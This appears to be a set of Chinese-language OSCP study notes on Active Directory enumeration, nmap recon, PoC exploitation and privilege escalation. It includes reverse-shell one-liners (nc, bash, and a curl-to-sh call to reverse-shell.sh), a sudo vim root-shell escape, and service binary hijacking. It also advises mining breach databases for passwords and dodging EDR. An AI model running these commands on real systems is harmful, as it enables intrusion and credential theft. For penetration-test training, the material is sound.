OSCP前導AD Security

什麼是AD?

微軟的 Windows Server 中，負責架構中大型網路環境的集中式目錄管理服務
（Directory Services），它處理在組織中的網路物件，物件可以是使用者、群組、電腦、網
域控制站、郵件、設定檔、組織單元、樹系等等，只要是在Active Directory結構定義檔
（schema）中定義的物件，就可以儲存在Active Directory資料檔中，並利用Active Directory
Service Interface來存取

這個結構只要我打到最上層的核心AD，我就可以管理所有電腦

AD(Active Directory)是一種架構，實際上在操控的是DC(Domain Controller)跟RODC(Read-Only Domain Controller)，RODC可以在無法連上DC網路的時候離線存取快取，也能阻擋一些駭客攻擊，是可以放在外網的物件

AD user

分成本地user(目前在用的主機)跟網域user
如果你在AD架構下想使用本地帳號只要在使用者名稱前面加上.\就可以以本地帳號登入電腦，或是用電腦名稱{user}

想登入AD網域的話就是直接打網域{user}就可以了

本地使用者帳號跟網域使用者帳號一樣是有可能的，但他們其實是不同的帳號

那你登入後會在AD server的C槽的Users底下，這邊有一個重點，如果你查資料夾沒有Administrator，就表示管理員沒來過這台電腦，那你也不用浪費時間打這台機器了，這張圖片.FUGUE就是Domain的帳號

那你也可以直接查看電腦的內容去看他的網域是多少，去判斷他是AD還是本地

在這個架構下的電腦會分成
Local區段跟Domain區段，Domain區段下面不會有使用者，使用者資訊都存在Server端，所以你登Domain帳號的時候他會去AD Domain存取你的使用者資訊

查詢本地使用者

可以用指令:

  • net user - 查看有哪些使用者
  • net user <Username> - 顯示該使用者的詳細資料

可以根據帳戶是否使用中去決定要不要打這台，如果帳戶使用中是no，那妳可以先不用找他，他可能是存在但是沒在用的帳號，上次設定密碼時間如果是很久以前，表示他很久沒有改密碼，那你可以挖看看社工庫，會有很大機率撈到他的密碼。

查詢Domain User

  • net user /domain
  • net user <username> /domain

要注意註解的部分，註解會有一些重要資訊
業界傳說：職位越高的主管密碼越弱

查詢網域群組

  • net groups /domain
  • net groups “Domain Admins” /domain
  • net groups “Schema Admins” /domain
  • net groups “Enterprise Admins” /domain

這些都很重要，都是值得打的目標

一些特殊群組 ：

  • Remote Desktop Users
    • 能夠 RDP 所有主機
  • Group Policy Creator Owners
    • 能夠用 GPO 搞事
  • Server Operators
    • 可以備份 DC
  • DNSAdmins
    • 可以在 DC 上跑 DLL
    • https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
  • Backup Operators
    • 可以備份 DC
  • Print Operators
    • 重開任何主機

網域下的電腦

預設C槽是共享的，Domain Admin 可以直接存取C槽
\<ip>\C$

怎麼知道我的AD server是哪一台
可以用
echo %logonserver%
nltest /dclist:
小技巧DC跟DNS通常是同一台，所以nslookup也大概可以查到

目標偵查

OSINT:
* Google Hacking
* Robots.txt
* WPScan(專門針對wordpress的掃描工具)
* Wappalyzer
* port scan
* nmap - 基本用法
* nmap -T4 - 需要較高的網路，他會提高速度(企業內網直接用這個command)
* nmap -T4 -Pn - 先ping主機，主機有回才會開掃，缺點是每一台都掃
* nmap -T4 -Pn -p- - 掃所有port
* nmap -T4 -Pn -p- -A - 自動偵測，好用但是動作很大花很多時間
* 掃 Port 順序:
1. 一般服務 (HTTP, HTTPS)80/443
2. 管理服務 (22, 3389)
3. 常見 Port (Top 1000)
4. 全掃
* 如果真的要掃全port用其他工具比較快，nmap詳細但是很慢
* 不要忘記掃127.0.0.1，不只外網可以掃，內網也可以掃
* 內網常常會有奇怪的服務，例如遊戲橘子會開服務在內網然後request他去開遊戲，這種服務通常是最高權限
* 目錄爆破(我們跟專業滲透師差在字典檔XDD)
* dirb
* dirb -X .zip/.7z/.rar

弱點利用

  • 找現成的Exploit，但是Exploit有可能是錯誤的，可能要自己改PoC或是調整版本。

舉例:GetSimple CMS
有打勾勾看起來是很穩定的PoC

看一下內容，可以猜出v=他的版本，並且版本要小於等於3.3.16

去看靶機的admin.php發現裡面寫3.3.17，不要太早下結論，看到版本更新就不打

可以猜到她是要開reverse shell 到 ip:port，可能要猜一下，看是誰在發文管理可能就是他了

  • 不開Reverse shell
    • 可能獲取RDP/SSH帳號->需要有開這些服務才能用
    • 密碼可能被hash
    • RDP登進去很明顯，正在使用的管理員會被踢出並且顯示有人正在登入，SSH也會顯示登入的IP
  • 開Reverse shell
    • 不用開port在主機上
      • 不怕防火牆
    • 幾乎所有系統都能開
    • 有一堆好用工具
      • Msfvenom,meterpreter,cobalt-strike,bash,socat,nc

簡單彈shell command

* nc -e /bin/bash IP PORT
* bash -c 'bash -i>& /dev/IP/PORT 0>&1'

  • 但是cheatsheet更香

  • 這個service更香

    • curl https://reverse-shell.sh/192.168.0.69:1337 | sh
    • 它會自動幫你判斷、彈shell

Reverse shell怎麼接

跑exploit

  • python 51475.py :
  • python 51475.py 172.31.2.1:8787 admin

會發現”This is not vulnrable to this CVE”，但後面又顯示”Webshell trigged sucessfully!”
其實是因為他可能像是改記事本改版本，實際上還是vulnrable的版本，這個PoC還可以不會因為版本不讓你跑，有的可能不讓你跑，你要自己改exploit可能改判斷的condition之類的，或是說知道原理可以直接跑不用判斷版本直接讓腳本跑起來。

成功彈完shell後，也接到shell後，開始要問自己”我是誰、我在哪、我要幹啥”

我是誰

先確認我是誰，在linux中下whoami後如果uid跟gid都是0，使用者名稱是root，那你就是成功提到最高權限了；windows也可以下whoami，使用者名稱會是NT AUTHORITY\SYSTEM

現在打whoami其實很危險，因為正常不會有人打這個指令，EDR或是一些資安軟體都會觸發警報，一個簡單的方法可以解決，就是找一個可以寫入的目錄隨便寫一個檔案，看owner是誰，就知道了，練習環境是沒差直接打就好了。

windows的架站軟體xampp，用的是最高權限的nt system，如果在127.0.0.1掃到xampp直接打開C槽找到htdoc/直接右鍵新增文件，手寫shell就直接打進去了，或是到php admin寫一個shell

我在哪

  • hostname：電腦的名稱
  • uname -a: 系統的核心版本
  • ps aux / top：電腦的執行 process
  • ifconfig / ip a：電腦的網路資訊
  • pwd：當前的資料夾
  • w：登入的 TTY 資訊
  • cat /etc/passwd：電腦中的使用者資訊

我要幹什麼

  • 了解電腦資訊、使用者資訊
  • 探索網路環境 (nmap、powershell掃port之類的)
  • 擬定攻擊行為
    • 尋找提權機會
    • 竊取竄改資料
    • 持續移動
    • 橫向移動
    • ransomeware?

常見的exploit失效原因

  • 版本錯誤
    • 版本欺騙/抓不到版號導致不執行
    • 有人手賤改版號躲scan(改回來就可以了)
    • 有時候廠商給A客戶和B客戶的版本3.3.1不一樣

    • =3.3.15，寫錯其實只能>3.3.15

  • 路徑錯誤
    • 路徑寫死了
    • WAF
    • 安全措施擋住了
  • 抓取資料有浮動性
    • 例如findAll(‘input’)[72]，可能剛下載預設才是第72個
    • 解決辦法就是開一個buff自己調整，自己調成正確的數字
    • 看懂PoC
  • 涵蓋描述錯誤
    • PoC是錯的，可能連python都跑不起來
    • 分析、改寫
    • 放棄

權限提升

通常怎麼提權

  • 設定問題
    • 權限沒設好
  • 使用者問題
    • 桌面放密碼.txt
    • 所以密碼都一樣
  • 系統漏洞
    • dirty pipe
    • windows永恆之藍
    • 系統的鍋，只能更新
  • 程式漏洞
    • 自己寫的或是買來的產品設計不良

Linux SUDO

sudo用來分權，讓使用者暫時有管理員權限

sudo提權:到/etc/sudoers設定
例如有些人打vim懶的用sudo，或直接設定使用者可以直接sudo vim
所以拿到webshell，除了whoami之外，sudo -l也用起來，通常會有一些東西

有管理員權限的vim可以幹嘛?
改shadow的密碼等等的
這時候也可以到GTFOBins(提權應用指南)去看一些別人提權後可以做的事

假設sudo vim，到GTFOB可以看到sudo vim -c ':!/bin/sh'就可以開一個root的shell

windows

windows很多服務都是以最高權限在跑，所以你可以換成你的惡意服務
實務上run起來的service會被咬住，這邊可以用move，因為windows的程式被load進去後她看的是file的handler，不看filename
move service.exe tmp.exe(把他的名字替換掉)
cp reverse-shell.exe service.exe(把你的shell改成她的名字)

要等他的server整台重開後才能讓service生效彈shell

  • Service Unquoted Path
  • Windows feature(可能是為了相容DOS)
    • exe可以省略不寫
    • 沒有用雙引號刮起來，會分段解析

windows會自己找exe跟沒有exe的檔案
ex:C:\Program Files (x86)\rilakkuma\rilakkuma 9.9\kuma.exe

windows的解析是:
先找
C:\Program.exe
好沒有
C:\Program Files.exe
沒有
C:\Program Files (x86)\rilakkuma\rilakkuma.exe
沒有
C:\Program Files (x86)\rilakkuma\rilakkuma 9.9\kuma.exe
找到了

你不一定可以碰到kuma.exe，但你可以在路徑中塞rilakkuma.exe，就可以在下一次服務跑你的exe

當紅隊的時候沒有這麼多時間會用
Linpeas:全自動提權資料蒐集工具(for linux)
Winpeas:一樣(for Windows)
OSCP不推薦用，之前有人被判違規
打紅隊可以用

利用弱點服務

電腦中使用高權限的程式，並且是有缺陷的

  • 安控元件
  • 盤點工具
  • 資料蒐集工具
  • 管理工具
  • 奇怪的東西

ex:127.0.0.1掃到remoting的服務，version是MS .NET Remoting service

.NET Remoting

.NET遠端處理是微軟.NET Framework中的網路通訊服務，和XML Web Service不同的是它可以使用SOAP以外的協定去通訊，在伺服器端和使用者端之間所操作的方法近乎相同，所以使用者可以不避考慮使用的協定就可以存取伺服器端開放的元件

打.NET Remoting就是要把local的function code 打成remote的code

  • 單程式模式
    • 呼叫Library的ReadFile去讀程式
  • Client/Server模式
    • 本地端在這個模式下可以透過TCP呼叫遠端的ReadFile去讀遠端的檔案
